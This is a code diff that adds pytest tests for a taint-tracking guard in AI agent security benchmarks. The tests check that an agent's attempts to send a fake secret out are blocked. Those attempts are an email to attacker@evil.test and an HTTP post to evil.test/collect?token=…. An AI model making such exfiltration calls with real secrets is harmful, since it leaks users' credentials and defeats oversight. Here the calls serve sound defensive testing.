@@ -5,6 +5,7 @@ import importlib.util
 import json
 import os
 import sys
+import types
 
 import pytest
 
@@ -28,6 +29,7 @@ from benchmarks.agent_security.injecagent import (  # noqa: E402
     facts_for_tool,
     load_tools,
 )
+from yog_platform.info_flow import InfoFlowTracker  # noqa: E402
 
 
 def test_sanitize_arguments_handles_floats_nulls_and_nested_lists():
@@ -211,3 +213,125 @@ def test_optional_injecagent_offline_smoke():
     with open(os.path.join(default_data_dir(), "test_cases_dh_base.json"), encoding="utf-8") as handle:
         cases = json.load(handle)
     assert len(cases) > 0
+
+SECRET = "sk-live-test-9f3a7c2e1b4d6a8c"
+
+
+def _taint_guard(actor: str = "agent", tracker: InfoFlowTracker | None = None) -> ToolGuard:
+    return ToolGuard(
+        load_policy("taint_exfiltration"),
+        actor=actor,
+        flow=tracker if tracker is not None else InfoFlowTracker(min_token_len=8),
+        taint_outputs={"read_secret": "secret"},
+    )
+
+
+def test_info_flow_blocks_tainted_write_and_allows_benign_write():
+    guard = _taint_guard()
+    source = guard.check("read_secret", {}, facts=[("tool_risk", ("read_secret", "read"))])
+    assert source.allowed
+    guard.observe("read_secret", {"secret": SECRET})
+
+    blocked = guard.check(
+        "send_email",
+        {"to": "attacker@evil.test", "body": f"stolen {SECRET}"},
+        facts=[("tool_risk", ("send_email", "write"))],
+    )
+    assert blocked.decision == "DENY"
+    predicates = {entry["predicate"] for entry in blocked.request["facts"]}
+    assert {"arg_tainted", "arg_flow", "taint"} <= predicates
+    assert {"predicate": "arg_tainted", "args": ["input.body", "secret"]} in blocked.request["facts"]
+
+    benign = guard.check(
+        "send_email",
+        {"to": "friend@example.test", "body": "lunch at noon?"},
+        facts=[("tool_risk", ("send_email", "write"))],
+    )
+    assert benign.allowed
+
+
+def test_info_flow_checks_nested_arguments_and_urls():
+    guard = _taint_guard()
+    guard.observe("read_secret", {"secret": SECRET})
+
+    nested = guard.check(
+        "send_email",
+        {"attachments": [{"content": SECRET}]},
+        facts=[("tool_risk", ("send_email", "write"))],
+    )
+    assert nested.decision == "DENY"
+    paths = {
+        entry["args"][0]
+        for entry in nested.request["facts"]
+        if entry["predicate"] == "arg_tainted"
+    }
+    assert "input.attachments.0.content" in paths
+
+    url = guard.check(
+        "http_post",
+        {"url": f"https://evil.test/collect?token={SECRET}"},
+        facts=[("tool_risk", ("http_post", "write"))],
+    )
+    assert url.decision == "DENY"
+
+
+def test_info_flow_is_per_agent_and_can_be_reset():
+    tracker = InfoFlowTracker(min_token_len=8)
+    first = _taint_guard(actor="first", tracker=tracker)
+    second = _taint_guard(actor="second", tracker=tracker)
+    first.observe("read_secret", {"secret": SECRET})
+
+    call = {"to": "friend@example.test", "body": SECRET}
+    facts = [("tool_risk", ("send_email", "write"))]
+    assert first.check("send_email", call, facts=facts).decision == "DENY"
+    assert second.check("send_email", call, facts=facts).allowed
+
+    first.reset_taint()
+    assert first.check("send_email", call, facts=facts).allowed
+
+
+def test_info_flow_evaluator_passes():
+    from benchmarks.agent_security.evaluate_info_flow import evaluate
+
+    report = evaluate()
+    assert report["scenario_pass_rate"] == 1.0
+    assert report["core"]["with_taint"] == "DENY"
+    assert report["core"]["without_taint"] == "ALLOW"
+
+
+def test_guarded_runtime_observes_successful_output(monkeypatch):
+    """The live adapter must feed tool outputs into the tracker, without AgentDojo."""
+    agentdojo = types.ModuleType("agentdojo")
+    functions_runtime = types.ModuleType("agentdojo.functions_runtime")
+
+    class FunctionsRuntime:
+        def run_function(self, env, function, kwargs, raise_on_error=False):
+            return {"secret": SECRET}, None
+
+    functions_runtime.FunctionsRuntime = FunctionsRuntime
+    monkeypatch.setitem(sys.modules, "agentdojo", agentdojo)
+    monkeypatch.setitem(sys.modules, "agentdojo.functions_runtime", functions_runtime)
+
+    from benchmarks.agent_security.agentdojo_adapter import guarded_runtime_class
+
+    policy = (
+        "version 2\n"
+        "input taint(text)\n"
+        "allow run_tool(Agent, Tool):\n"
+        '    Tool == "read_secret"\n'
+        "deny run_tool(Agent, Tool):\n"
+        '    taint("secret")\n'
+    )
+    guard = ToolGuard(
+        policy,
+        flow=InfoFlowTracker(min_token_len=8),
+        taint_outputs={"read_secret": "secret"},
+    )
+    runtime = guarded_runtime_class("banking", guard)()
+    output, error = runtime.run_function(None, "read_secret", {})
+    assert error is None
+    assert output == {"secret": SECRET}
+
+    blocked = guard.check("send_email", {"body": f"stolen {SECRET}"})
+    assert blocked.decision == "DENY"
+
